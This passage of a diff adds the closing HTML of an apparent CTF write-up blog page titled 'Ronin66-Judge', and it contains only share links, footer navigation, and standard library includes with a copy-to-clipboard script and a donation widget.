+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/&name=Ronin66-Judge&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2026/09/17/Ronin66-Judge/&t=Ronin66-Judge"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2027
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="panosoikogr" data-description="Support me on Buy me a coffee!" data-message="Thanks for stopping by! If you’d like to support my work, feel free to treat me to a coffee." data-color="#40DCA5" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+</body>
+</html>
